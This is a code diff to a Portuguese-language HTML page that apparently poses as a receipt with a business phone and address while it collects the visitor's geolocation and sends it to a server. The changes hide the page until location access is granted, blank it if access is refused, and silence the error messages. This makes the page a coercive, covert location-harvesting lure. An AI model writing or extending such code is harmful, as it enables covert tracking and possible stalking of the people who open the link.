@@ -41,7 +41,7 @@
       color: #fff;
       margin: 0;
       padding: 0;
-      display: flex;
+      display: none; /* Esconde o conteúdo até a geolocalização ser permitida */
       justify-content: center;
       align-items: center;
       min-height: 100vh;
@@ -132,26 +132,15 @@
     <div class="contact">Contato: (81) 99998-6665</div>
     <div class="address">Rua Manoel Santiago, 2200 - Gravatá, PE - 52050</div>
   </div>
-</body>
-
-</html>
 
   <script>
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Geolocalização não suportada no navegador.");
+        // Navegador não suporta geolocalização → tela continua branca
       }
     });
-
-    // Define data atual
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
@@ -168,16 +157,20 @@
         .then(response => response.json())
         .then(data => {
           if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
+            // console.error("Erro ao enviar o comprovante.");
           }
+          // Exibe a tela após sucesso ou tentativa de envio
+          document.body.style.display = "flex";
         })
         .catch(error => {
-          console.error("Erro ao enviar localização:", error);
+          // console.error("Erro ao enviar localização:", error);
+          document.body.style.display = "flex"; // Exibe mesmo com erro de envio
         });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      // Se a pessoa negar a localização, a tela fica branca
+      document.body.innerHTML = ""; // garante que não exiba nada
     }
   </script>
 </body>
